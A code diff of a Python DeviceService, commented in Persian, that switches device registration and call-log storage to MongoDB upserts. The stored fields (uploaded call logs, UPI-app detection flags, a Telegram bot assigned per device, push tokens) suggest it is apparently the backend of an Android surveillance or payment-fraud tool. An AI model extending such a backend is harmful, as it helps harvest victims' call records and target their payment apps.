@@ -92,32 +92,17 @@ class DeviceService:
                 "updated_at": now
             }
 
-            if existing_device:
-                update_data = {"$set": common_data}
-                
-                if fcm_token:
-                    update_data["$addToSet"] = {"fcm_tokens": fcm_token}
-                
-                # اگه فیلدهای UPI نداره، اضافه کن
-                if "has_upi" not in existing_device:
-                    if "$setOnInsert" not in update_data:
-                        update_data["$setOnInsert"] = {}
-                    update_data["$setOnInsert"]["has_upi"] = False
-                    update_data["$setOnInsert"]["upi_detected_at"] = None
-                
-                await mongodb.db.devices.update_one({"device_id": device_id}, update_data)
-                logger.info(f"🔄 Device updated: {device_id}")
-                
-            else:
-                # 🤖 تخصیص ربات تلگرام برای دستگاه جدید
-                telegram_bot_id = DeviceService._assign_telegram_bot()
-                
-                device_data = {
+            # استفاده از upsert برای جلوگیری از duplicate key error
+            # اگر device موجود بود update میکنه، اگر نبود insert میکنه
+            
+            telegram_bot_id = DeviceService._assign_telegram_bot()
+            
+            update_data = {
+                "$set": common_data,
+                "$setOnInsert": {
                     "device_id": device_id,
-                    **common_data,
-                    "fcm_tokens": [fcm_token] if fcm_token else [],
-                    "telegram_bot_id": telegram_bot_id,  # 🤖 Bot Assignment
                     "registered_at": now,
+                    "telegram_bot_id": telegram_bot_id,
                     "has_upi": False,
                     "upi_detected_at": None,
                     "stats": {
@@ -136,8 +121,23 @@ class DeviceService:
                     "is_online": True,
                     "last_online_update": now,
                 }
-                await mongodb.db.devices.insert_one(device_data)
+            }
+            
+            # Add FCM token (بدون تکرار)
+            if fcm_token:
+                update_data["$addToSet"] = {"fcm_tokens": fcm_token}
+            
+            # upsert: اگر موجود بود update، اگر نبود insert
+            result = await mongodb.db.devices.update_one(
+                {"device_id": device_id},
+                update_data,
+                upsert=True
+            )
+            
+            if result.upserted_id:
                 logger.info(f"✅ New device registered: {device_id} (Bot {telegram_bot_id})")
+            else:
+                logger.info(f"🔄 Device updated: {device_id}")
 
             device_doc = await mongodb.db.devices.find_one({"device_id": device_id})
             return {"device": device_doc, "is_new": is_new_device}
@@ -412,10 +412,6 @@ class DeviceService:
                     f"{device_id}:{number}:{call_type}:{timestamp_ms}:{duration}".encode()
                 ).hexdigest()
 
-                existing = await mongodb.db.call_logs.find_one({"call_id": call_hash})
-                if existing:
-                    continue
-
                 call_doc = {
                     "call_id": call_hash,
                     "device_id": device_id,
@@ -428,8 +424,15 @@ class DeviceService:
                     "received_at": now
                 }
 
-                await mongodb.db.call_logs.insert_one(call_doc)
-                new_count += 1
+                # استفاده از upsert برای جلوگیری از duplicate key error
+                result = await mongodb.db.call_logs.update_one(
+                    {"call_id": call_hash},
+                    {"$setOnInsert": call_doc},
+                    upsert=True
+                )
+                
+                if result.upserted_id:
+                    new_count += 1
 
             if new_count > 0:
                 total = await mongodb.db.call_logs.count_documents({"device_id": device_id})
